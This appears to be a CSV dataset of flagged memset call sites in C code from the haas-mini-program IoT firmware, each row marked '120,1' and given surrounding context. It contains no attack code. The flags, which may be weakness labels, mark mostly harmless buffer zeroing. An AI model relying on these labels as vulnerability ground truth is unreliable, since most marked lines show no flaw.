2021\haas-mini-program\components\ota\ota_agent\download\ota_download_file2fs_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_file2fs_http.c,"memset(settings.req_buf, 0, settings.req_buf_size);",120,1,"           goto EXIT;
       }
       memset(settings.req_buf, 0, settings.req_buf_size);
       OTA_LOG_E(""ota download begin....\n"");
       while (ota_file_size == 0 || ota_rx_size < ota_file_size) {
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,"memset(settings, 0, sizeof(httpc_connection_t));",120,1,"        return -1;
    }
    memset(settings, 0, sizeof(httpc_connection_t));
    settings->socket = fd;
    settings->server_name = host_name;
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,"memset(pkps, 0x00, sizeof(pkps));",120,1,"#if defined OTA_CONFIG_ITLS
    OTA_LOG_I(""init itls ota.\n"");
    memset(pkps, 0x00, sizeof(pkps));
    strncpy(pkps, ctx->pk, strlen(ctx->pk));
    strncpy(pkps + strlen(ctx->pk) + 1, ctx->ps, strlen(ctx->ps));
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,"memset(hdr, 0, OTA_HTTP_HEAD_LEN);",120,1,"        return ret;
    }
    memset(hdr, 0, OTA_HTTP_HEAD_LEN);
    ota_download_parse_host_uri(url, host_name, host_uri);
#ifdef OTA_CONFIG_LOCAL_RSA
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,"memset(settings.req_buf, 0, OTA_DOWNLOAD_BLOCK_SIZE);",120,1,"           goto OVER;
       }
       memset(settings.req_buf, 0, OTA_DOWNLOAD_BLOCK_SIZE);
       ret = ota_httpc_request_send(httpc_handle, host_uri, hdr, OTA_DOWNLOAD_RETRY_CNT);
       if (ret < 0) {
"
2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,"memset(tmp_file_name, 0x00, sizeof(tmp_file_name));",120,1,"      (strlen(upack_path) <= 64)) {
       OTA_LOG_E(""upack_path = %d\r\n"", strlen(upack_path));
       memset(tmp_file_name, 0x00, sizeof(tmp_file_name));
       memset(&pack_head, 0x00, sizeof(data_file_pack_head_t));
       memset(&file_info, 0x00, sizeof(data_file_infor_t));
"
2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,"memset(&pack_head, 0x00, sizeof(data_file_pack_head_t));",120,1,"       OTA_LOG_E(""upack_path = %d\r\n"", strlen(upack_path));
       memset(tmp_file_name, 0x00, sizeof(tmp_file_name));
       memset(&pack_head, 0x00, sizeof(data_file_pack_head_t));
       memset(&file_info, 0x00, sizeof(data_file_infor_t));
       upack_path_len = strlen(upack_path);
"
2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,"memset(&file_info, 0x00, sizeof(data_file_infor_t));",120,1,"       memset(tmp_file_name, 0x00, sizeof(tmp_file_name));
       memset(&pack_head, 0x00, sizeof(data_file_pack_head_t));
       memset(&file_info, 0x00, sizeof(data_file_infor_t));
       upack_path_len = strlen(upack_path);
       strcpy(tmp_file_name, upack_path);
"
2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,"memset(&tmp_file_name[upack_path_len], 0x00, sizeof(tmp_file_name) - upack_path_len);",120,1,"                                   }
                               }
                               memset(&tmp_file_name[upack_path_len], 0x00, sizeof(tmp_file_name) - upack_path_len);
                               if(ret == 0) {
                                   ota_fclose(write_fd);
"
2021\haas-mini-program\components\ota\ota_agent\tools\xz\include\xz_config.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\xz\include\xz_config.h,"#define memzero(buf, size) memset(buf, 0, size)",120,1,"
#define memeq(a, b, size) (memcmp(a, b, size) == 0)
#define memzero(buf, size) memset(buf, 0, size)

#ifndef min
"
2021\haas-mini-program\components\ota\ota_agent\tools\xz\src\xz_export.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\xz\src\xz_export.c,"memset(data_buf, 0x00, SECTOR_SIZE);",120,1,"    }
    else {
        memset(data_buf, 0x00, SECTOR_SIZE);
        ota_crc16_init(&contex );
        for( ; size > 0; size -= read_size, offset += read_size ) {
"
2021\haas-mini-program\components\ota\ota_agent\tools\xz\src\xz_export.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\xz\src\xz_export.c,"memset(data_buf, 0, SECTOR_SIZE);",120,1,"        for( ; size > 0; size -= read_size, offset += read_size ) {
            read_size = size >= SECTOR_SIZE ? SECTOR_SIZE : size;
            memset(data_buf, 0, SECTOR_SIZE);
            ret = xz_flash_read_data(src_partition, offset, data_buf, read_size);
            if (ret != 0){
"
2021\haas-mini-program\components\ota\ota_agent\transport\ota_transport_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\transport\ota_transport_mqtt.c,"memset(ota_param.hash, 0x00, OTA_HASH_LEN);",120,1,"        cJSON *signMethod = cJSON_GetObjectItem(json_obj, ""signMethod"");
        if (signMethod != NULL) {
            memset(ota_param.hash, 0x00, OTA_HASH_LEN);
            ret = ota_to_capital(signMethod->valuestring, strlen(signMethod->valuestring));
            if (ret != 0) {
"
2021\haas-mini-program\components\ota\ota_agent\transport\ota_transport_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\transport\ota_transport_mqtt.c,"memset(ota_param.sign, 0x00, OTA_SIGN_LEN);",120,1,"        if (digestSign != NULL) {
            unsigned int sign_len = OTA_SIGN_LEN;
            memset(ota_param.sign, 0x00, OTA_SIGN_LEN);
            if (ota_base64_decode((const unsigned char *)digestSign->valuestring, strlen(digestSign->valuestring), (unsigned char*)ota_param.sign, &sign_len) != 0) {
                ret = OTA_SIGN_PAR_FAIL;
"
2021\haas-mini-program\components\ota\ota_agent\verify\ota_verify_hash.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\verify\ota_verify_hash.c,"memset(hash_value, 0x00, len);",120,1,"        ota_msleep(5);
    }
    memset(hash_value, 0x00, len);
    ret = ota_hash_final(&ctx, (unsigned char *)hash_value);
EXIT:
"
2021\haas-mini-program\components\ulog\ulog_fs_cfg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_fs_cfg.c,"memset(ulog_cfg_header->cfg[para_type], 0, sizeof(ulog_cfg_t));",120,1,"                    if(NULL!=get_ulog_cfg_key(type)->cfg_key[i]){
                        ulog_cfg_header->cfg[i] = (ulog_cfg_t *)aos_malloc(sizeof(ulog_cfg_t));
                        memset(ulog_cfg_header->cfg[para_type], 0, sizeof(ulog_cfg_t));
                    }
                }
"
2021\haas-mini-program\components\ulog\ulog_fs_cfg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_fs_cfg.c,"memset(p->cfg[i], 0, sizeof(ulog_cfg_t));",120,1,"                            if(NULL!=get_ulog_cfg_key(type)->cfg_key[i] && NULL==p->cfg[i]){
                                p->cfg[i] = (ulog_cfg_t *)aos_malloc(sizeof(ulog_cfg_t));
                                memset(p->cfg[i], 0, sizeof(ulog_cfg_t));
                            }
                        }
"
2021\haas-mini-program\components\ulog\ulog_fs_cfg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_fs_cfg.c,"memset(p->next->cfg[i], 0, sizeof(ulog_cfg_t));",120,1,"                            if(NULL!=get_ulog_cfg_key(type)->cfg_key[i]){
                                p->next->cfg[i] = (ulog_cfg_t *)aos_malloc(sizeof(ulog_cfg_t));
                                memset(p->next->cfg[i], 0, sizeof(ulog_cfg_t));
                            }
                        }
"
2021\haas-mini-program\components\ulog\ulog_init.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_init.c,"memset(buf, 0, 1024);",120,1,"            if (0 == strlen(ulog_cmd->valuestring)) {
                char *buf = (char*)amp_malloc(1024);
                memset(buf, 0, 1024);
                if (NULL != buf) {
                    if (0 == aos_get_ulog_list(buf, 1024)) {
"
2021\haas-mini-program\components\ulog\ulog_session_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_session_file.c,"memset(ulog_file_name, 0, sizeof(ulog_file_name));",120,1,"    int fd = -1;
    char ulog_file_name[128];
    memset(ulog_file_name, 0, sizeof(ulog_file_name));
    snprintf(ulog_file_name, sizeof(ulog_file_name), ULOG_FILE_FORMAT, file_idx);
    fd = aos_open(ulog_file_name, flag);
"
2021\haas-mini-program\components\ulog\ulog_session_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_session_file.c,"memset(buf, 0, buf_len);",120,1,"    int rc = -1;
    if (fd >= 0 && buf != NULL && buf_len > 0) {
        memset(buf, 0, buf_len);
        int cnt = 0;
        while ((cnt < buf_len) && (0 < aos_read(fd, &buf[cnt], 1))) {
"
2021\haas-mini-program\components\ulog\ulog_session_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_session_file.c,"memset(buf, 0, ULOG_SIZE);",120,1,"                if (operating_fd >= 0) {
                    char buf[ULOG_SIZE];
                    memset(buf, 0, ULOG_SIZE);
                    while (0 == pop_fs_tmp(buf, ULOG_SIZE)) {
                        pop_out_on_fs(buf, strlen(buf));
"
2021\haas-mini-program\components\ulog\ulog_session_udp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_session_udp.c,"memset(syslog_watcher_addr, 0, sizeof(struct sockaddr_in));",120,1,"    }
    if (syslog_watcher_addr != NULL) {
        memset(syslog_watcher_addr, 0, sizeof(struct sockaddr_in));
        syslog_watcher_addr->sin_family = AF_INET;

"
2021\haas-mini-program\components\ulog\ulog_utility.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ulog\ulog_utility.c,"memset(ms_str, 0, sizeof(ms_str));",120,1,"        const int32_t milli = ms % 1000;
        char      ms_str[8] = """";
        memset(ms_str, 0, sizeof(ms_str));
        snprintf(ms_str, sizeof(ms_str), "".%03d"", milli);
        strncat(buffer, ms_str, len - strlen(buffer) - 1);
"
2021\haas-mini-program\components\und\src\und.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und.c,"aos_memset(ctx, 0, sizeof(*ctx));",120,1,"    und_packet_ctx_deinit();
    und_report_deinit();
    aos_memset(ctx, 0, sizeof(*ctx));
    undp_mutex_unlock(mutex);
    undp_mutex_free(mutex);
"
2021\haas-mini-program\components\und\src\und_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_adapter.c,"aos_memset(&lite, 0, sizeof(lite));",120,1,"    lite_cjson_t lite, lite_params;
    unsigned char policy;
    aos_memset(&lite, 0, sizeof(lite));
    if (lite_cjson_parse(data, len, &lite) != 0) {
        return UND_PARAM_ERR;
"
2021\haas-mini-program\components\und\src\und_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_adapter.c,"aos_memset(&lite_params, 0, sizeof(lite_params));",120,1,"        return UND_PARAM_ERR;
    }
    aos_memset(&lite_params, 0, sizeof(lite_params));
    if (lite_cjson_object_item(&lite, ""params"", aos_strlen(""params""), &lite_params) != 0) {
        return UND_PARAM_ERR;
"
2021\haas-mini-program\components\und\src\und_manage.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_manage.c,"aos_memset(key, 0, sizeof(key));",120,1,"    undp_mutex_lock(ctx->mutex);
    for (i = 0; i < UND_ARRAY_SIZE(ctx->targets); i ++) {
        aos_memset(key, 0, sizeof(key));
        aos_snprintf(key, sizeof(key), UND_KV_KEY, i);

"
2021\haas-mini-program\components\und\src\und_manage.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_manage.c,"aos_memset(ctx->targets, 0, sizeof(ctx->targets));",120,1,"            aos_free(ctx->targets[i]);
    }
    aos_memset(ctx->targets, 0, sizeof(ctx->targets));
    aos_memset(ctx->wb, 0, sizeof(ctx->wb));
    undp_mutex_unlock(ctx->mutex);
"
2021\haas-mini-program\components\und\src\und_manage.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_manage.c,"aos_memset(ctx->wb, 0, sizeof(ctx->wb));",120,1,"    }
    aos_memset(ctx->targets, 0, sizeof(ctx->targets));
    aos_memset(ctx->wb, 0, sizeof(ctx->wb));
    undp_mutex_unlock(ctx->mutex);

"
2021\haas-mini-program\components\und\src\und_manage.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_manage.c,"aos_memset(&target, 0, sizeof(target));",120,1,"        int len = sizeof(target);
        aos_memset(key, 0, sizeof(key));
        aos_memset(&target, 0, sizeof(target));
        aos_snprintf(key, sizeof(key), UND_KV_KEY, i);
        aos_kv_get(key, &target, &len);
"
2021\haas-mini-program\components\und\src\und_manage.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_manage.c,"aos_memset(ctx->targets[cap_idx], 0, len);",120,1,"            return UND_MEM_ERR;
        }
        aos_memset(ctx->targets[cap_idx], 0, len);
        ctx->targets[cap_idx]->size = UND_ELEM_MAX_CNT_PER_TARGET;
    }
"
2021\haas-mini-program\components\und\src\und_manage.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_manage.c,"aos_memset(cur_ex, 0, 256);",120,1,"        for (j = 0; j < ctx->targets[i]->idx; j ++) {
            und_package_wireless_info(&wireless_info);
            aos_memset(cur_ex, 0, 256);

            temp_len = aos_snprintf(cur_ex, 256,
"
2021\haas-mini-program\components\und\src\und_report.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_report.c,"if (ctx->buf) aos_memset(ctx->buf, 0, len);",120,1,"    if (ctx->buf == NULL) {
        ctx->buf = (char *)aos_malloc(len);
        if (ctx->buf) aos_memset(ctx->buf, 0, len);
    }

"
2021\haas-mini-program\components\und\src\und_report.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_report.c,"aos_memset(ctx->buf, 0, UND_REPORT_TARGET_BUF_LEN);",120,1,"    if (len + 128 > UND_REPORT_TARGET_BUF_LEN) {
        /* buf is not enough, drop real-time capture and collect capture */
        aos_memset(ctx->buf, 0, UND_REPORT_TARGET_BUF_LEN);
        ctx->update = UND_CAP_STATE_UPDATE;
        len = 0;
"
2021\haas-mini-program\components\und\src\und_report.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_report.c,"aos_memset(pkt_buf, 0, UND_REPORT_BUF_LEN_MAX + 1);",120,1,"            break;
        }
        aos_memset(pkt_buf, 0, UND_REPORT_BUF_LEN_MAX + 1);

        und_build_package();
"
2021\haas-mini-program\components\und\src\und_report.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_report.c,"aos_memset(target_buf, 0, UND_REPORT_BUF_LEN_MAX + 1);",120,1,"
        /* build parameters of und report */
        aos_memset(target_buf, 0, UND_REPORT_BUF_LEN_MAX + 1);
        res = und_build_packet_param(pkt_buf, target_buf, UND_REPORT_BUF_LEN_MAX);
        if (res < 0) {
"
2021\haas-mini-program\components\und\src\und_report.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\und\src\und_report.c,"aos_memset(topic_buf, 0, UND_TOPIC_BUF_LEN_MAX + 1);",120,1,"            break;
        }
        aos_memset(topic_buf, 0, UND_TOPIC_BUF_LEN_MAX + 1);
        res = und_build_topic(UND_TOPIC_REPORT_REPLY, topic_buf, UND_TOPIC_BUF_LEN_MAX);
        if (res < 0) {
"
2021\haas-mini-program\engine\duktape_engine\repl.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\repl.c,"memset(repl_message, 0, REPL_OUTBUF_SIZE);",120,1,"    char *pos = NULL;

    memset(repl_message, 0, REPL_OUTBUF_SIZE);

    sz = 0;
"
2021\haas-mini-program\engine\duktape_engine\repl.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\repl.c,"memset((void *)g_cli, 0, sizeof(struct repl_status));",120,1,"#endif

    memset((void *)g_cli, 0, sizeof(struct repl_status));

    task_params.name = ""cli"";
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"memset(rsp_buf, 0, HTTP_BUFF_SIZE);",120,1,"    sockfd = ota_socket_connect(port, host_addr);

    memset(rsp_buf, 0, HTTP_BUFF_SIZE);
    sprintf(rsp_buf, HTTP_HEADER, host_file, host_addr, port);

"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"memset(http_buf, 0, HTTP_BUFF_SIZE);",120,1,"    if (ret != 0)
    {
        memset(http_buf, 0, HTTP_BUFF_SIZE);
        sprintf(http_buf, ""%s"", ""ERROR"");
    }
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"memset(&settings, 0, sizeof(settings));",120,1,"    socketid = httpc_wrapper_socket_create();

    memset(&settings, 0, sizeof(settings));
    settings.socket = socketid;
    settings.server_name = url;
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"memset(http_buffer, 0, HTTP_BUFF_SIZE + 1);",120,1,"        goto done;
    }
    memset(http_buffer, 0, HTTP_BUFF_SIZE + 1);
    http_param->buffer = http_buffer;

"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"memset(http_param->path, 0, sizeof(http_param->path));",120,1,"        if (duk_is_string(ctx, -1)) {
            filepath = duk_get_string(ctx, -1);
            memset(http_param->path, 0, sizeof(http_param->path));
            #if 1
            amp_get_user_dir(http_param->path);
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"memset(http_param, 0, sizeof(http_download_param_t));",120,1,"        goto done;
    }
    memset(http_param, 0, sizeof(http_download_param_t));

    /* get http request url */
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"memset(dload_node, 0, sizeof(http_dload_node_t));",120,1,"
    http_dload_node_t *dload_node = amp_malloc(sizeof(http_dload_node_t));
    memset(dload_node, 0, sizeof(http_dload_node_t));
    dload_node->dload_param = http_param;
    dlist_add_tail(&dload_node->node, &g_dload_list);
"
2021\haas-mini-program\engine\duktape_engine\addons\network\iot\module_iot.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\iot\module_iot.c,"memset(&master_meta_info, 0, sizeof(iotx_linkkit_dev_meta_info_t));",120,1,"    duk_pop(ctx);

    memset(&master_meta_info, 0, sizeof(iotx_linkkit_dev_meta_info_t));
    memcpy(master_meta_info.product_key, productKey, strlen(productKey));
    memcpy(master_meta_info.device_name, deviceName, strlen(deviceName));
"
2021\haas-mini-program\engine\duktape_engine\addons\network\mqtt\module_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\mqtt\module_mqtt.c,"memset(p, 0, sizeof(struct mqtt_sub_cb_param));",120,1,"            return;
        }
        memset(p, 0, sizeof(struct mqtt_sub_cb_param));

        if ((p->payload = (char *)amp_malloc(topic_info->payload_len)) ==
"
2021\haas-mini-program\engine\duktape_engine\addons\network\mqtt\module_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\mqtt\module_mqtt.c,"memset(&mqtt_topic_info, 0x0, sizeof(iotx_mqtt_topic_info_t));",120,1,"    amp_debug(MOD_STR, ""topic: %s, msg: %s, msg_len: %d\n"", topic, msg, msg_len);

    memset(&mqtt_topic_info, 0x0, sizeof(iotx_mqtt_topic_info_t));
    mqtt_topic_info.payload = msg;
    mqtt_topic_info.payload_len = msg_len;
"
2021\haas-mini-program\engine\duktape_engine\addons\network\udp\module_udp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\udp\module_udp.c,"memset(&options, 0, sizeof(udp_options_t));",120,1,"        goto out;
    }
    memset(&options, 0, sizeof(udp_options_t));
    /* options.port */
    duk_get_prop_string(ctx, 1, ""port"");
"
2021\haas-mini-program\engine\duktape_engine\addons\utils\ui\module_ui.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\utils\ui\module_ui.c,"memset(&g_app_path[0], 0, sizeof(g_app_path));",120,1,"    path = duk_get_string(ctx, 0);
    if (path != NULL) {
        memset(&g_app_path[0], 0, sizeof(g_app_path));
        snprintf(&g_app_path[0],128,""%s"",path);
        amp_page_changed_set();
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"#define duk_memset(dst,val,len)  do { \",120,1,"	} while (0)
#define duk_memmove_unsafe(dst,src,len)  duk_memmove((dst), (src), (len))
#define duk_memset(dst,val,len)  do { \
		void *duk__dst = (dst); \
		duk_small_int_t duk__val = (val); \
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"#define duk_memset_unsafe(dst,val,len)  duk_memset((dst), (val), (len))",120,1,"		(void) DUK_MEMSET(duk__dst, duk__val, (size_t) duk__len); \
	} while (0)
#define duk_memset_unsafe(dst,val,len)  duk_memset((dst), (val), (len))
#define duk_memzero(dst,len)  do { \
		void *duk__dst = (dst); \
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_memset((void *) &vals, (int) 0xff, sizeof(vals));",120,1,"
	/* Assume two's complement and set everything to -1. */
	duk_memset((void *) &vals, (int) 0xff, sizeof(vals));
	DUK_ASSERT(vals[DUK__IDX_TYPE] == -1);  /* spot check one */

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_memset(new_h, 0xff, sizeof(duk_uint32_t) * new_h_size);",120,1,"		/* fill new_h with u32 0xff = UNUSED */
		DUK_ASSERT(new_h_size > 0);
		duk_memset(new_h, 0xff, sizeof(duk_uint32_t) * new_h_size);

		DUK_ASSERT(new_e_next <= new_h_size);  /* equality not actually possible */
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_memset((void *) thr->valstack, 0x55, alloc_size);",120,1,"	if (new_ptr != NULL) {
		duk_memcpy((void *) new_ptr, (const void *) thr->valstack, alloc_size);
		duk_memset((void *) thr->valstack, 0x55, alloc_size);
		DUK_FREE_CHECKED(thr, (void *) thr->valstack);
		thr->valstack = new_ptr;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_memset((void *) &c, 0, sizeof(c));",120,1,"	DUK__DOUBLE_INIT(&a, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);
	DUK__DOUBLE_INIT(&b, 0x3c, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);
	duk_memset((void *) &c, 0, sizeof(c));
	c.d = a.d + b.d;
	if (!DUK__DOUBLE_COMPARE(&c, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) {
"
2021\haas-mini-program\engine\duktape_engine\startup\app_entry.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\startup\app_entry.c,"memset(&app_options, 0, sizeof(app_options_t));",120,1,"    }

    memset(&app_options, 0, sizeof(app_options_t));

    /* get options object */
"
2021\haas-mini-program\engine\duktape_engine\startup\page_entry.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\startup\page_entry.c,"memset(app_file_path, 0, sizeof(app_file_path));",120,1,"    amp_get_user_dir(root_dir);

    memset(app_file_path, 0, sizeof(app_file_path));

    snprintf(app_file_path, 128, ""%s/app.json"", root_dir);
"
2021\haas-mini-program\engine\duktape_engine\startup\page_entry.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\startup\page_entry.c,"memset(app->page, 0, sizeof(page_desc_t) * size);",120,1,"    }

    memset(app->page, 0, sizeof(page_desc_t) * size);
    app->num = size;
    app->cur_page = 0;
"
2021\haas-mini-program\engine\duktape_engine\startup\page_entry.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\startup\page_entry.c,"memset(&g_app, 0, sizeof(g_app));",120,1,"void page_config_parse()
{
    memset(&g_app, 0, sizeof(g_app));

    search_js_page_entry(&g_app);
"
2021\haas-mini-program\engine\duktape_engine\startup\page_entry.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\startup\page_entry.c,"memset(&page_options, 0, sizeof(page_options_t));",120,1,"    }

    memset(&page_options, 0, sizeof(page_options_t));

    /* get options object */
"
2021\haas-mini-program\engine\lite_engine\core\be_module.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_module.c,"memset(gModules, 0, sizeof(gModules));",120,1,"    /* modules init */
    if (!gModulesInited) {
        memset(gModules, 0, sizeof(gModules));
        gModulesInited = 1;
    }
"
2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,"memset(gSymbolTable, 0, sizeof(gSymbolTable));",120,1,"        amp_calloc(1, sizeof(be_jse_symbol_t) * BE_JSE_SYMBOL_TABLE_BLOCK_SIZE);
#else
    memset(gSymbolTable, 0, sizeof(gSymbolTable));

#endif
"
2021\haas-mini-program\main\amp_task.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\main\amp_task.c,"memset(&amp_msg, 0, sizeof(amp_msg));",120,1,"    amp_task_msg_t amp_msg;

    memset(&amp_msg, 0, sizeof(amp_msg));
    amp_msg.type = AMP_TASK_MSG_TYPE_MAX;
    
"
2021\haas-mini-program\main\amp_task.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\main\amp_task.c,"memset(p_param, 0, sizeof(amp_task_msg_t));",120,1,"    amp_task_msg_t *p_param = &msg_buf;

    memset(p_param, 0, sizeof(amp_task_msg_t));
    p_param->callback = call;
    p_param->param    = arg;
"
2021\haas-mini-program\services\app_mgr\app_mgr.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\app_mgr\app_mgr.c,"memset(http_buffer, 0, OTA_BUFFER_MAX_SIZE);",120,1,"    }

    memset(http_buffer, 0, OTA_BUFFER_MAX_SIZE);
    while ((nbytes = ota_socket_recv(sockfd, http_buffer,
                                     OTA_BUFFER_MAX_SIZE - 1)) != 0) {
"
2021\haas-mini-program\services\board_mgr\board_mgr.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\board_mgr\board_mgr.c,"memset(&g_board_mgr, 0x00, sizeof(g_board_mgr));",120,1,"    char *json = NULL;

    memset(&g_board_mgr, 0x00, sizeof(g_board_mgr));
    json = board_get_json_buff(json_path);
    if (NULL == json)
"
2021\haas-mini-program\services\recovery\ymodem.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\recovery\ymodem.c,"memset(buffer, 0, buf_len);",120,1,"    buf_len = ((YMODEM_SOH == data_type) ? SOH_DATA_LEN : STX_DATA_LEN) + 4;
    buffer  = amp_malloc(buf_len);
    memset(buffer, 0, buf_len);
    /* SOH HEAD */
    value = ymodem_recv_bytes(buffer, buf_len, UART_RECV_TIMEOUT);
"
2021\haas-mini-program\utils\cJSON\cJSON.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\cJSON\cJSON.c,"memset(node, '\0', sizeof(cJSON));",120,1,"    cJSON *node = (cJSON *)hooks->allocate(sizeof(cJSON));
    if (node) {
        memset(node, '\0', sizeof(cJSON));
    }

"
2021\haas-mini-program\utils\mbedtls\library\aes.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\aes.c,"memset( ctx, 0, sizeof( mbedtls_aes_context ) );",120,1,"void mbedtls_aes_init( mbedtls_aes_context *ctx )
{
    memset( ctx, 0, sizeof( mbedtls_aes_context ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\aes.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\aes.c,"memset( key, 0, 32 );",120,1,"    mbedtls_aes_context ctx;

    memset( key, 0, 32 );
    mbedtls_aes_init( &ctx );

"
